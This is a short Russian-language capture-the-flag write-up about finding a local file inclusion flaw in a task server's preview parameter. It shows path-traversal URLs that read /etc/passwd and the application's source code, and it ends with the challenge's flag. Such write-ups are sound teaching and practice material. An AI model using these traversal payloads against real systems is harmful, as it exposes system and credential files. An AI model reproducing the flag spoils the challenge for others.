# Разведка
Изучив сайт я заметил, что сайт может читать файлы по ручке:
http://task.duckerz.ru:21045/preview?draft=courses/python101.md
Из этого можно сделать вывод, что тут может быть уязвимость LFI

# Проверка уязвимости
Для проверки уязвимости я решил попытаться прочитать файл etc/passwd
http://task.duckerz.ru:21045/preview?draft=../../../../etc/passwd
##### Результат:
<img width="789" height="434" alt="Pasted image 20261003122517" src="https://github.com/user-attachments/assets/fba5fe12-2c5c-427d-8c13-5c03d56850ac" />

В итоге уязвимость подтвердилась.

# Эксплуатация уязвимости и поиск флага
Посмотрим код web приложения:
http://task.duckerz.ru:21045/preview?draft=../../../../app/app.py
<img width="772" height="331" alt="Pasted image 20261003124258" src="https://github.com/user-attachments/assets/1e2b17fe-cf66-41ae-b278-7865c96842fb" />

Флаг найден.
DUCKERZ{d3BU9_COn5o1E_gr4nT5_f1nAl_6rADe}
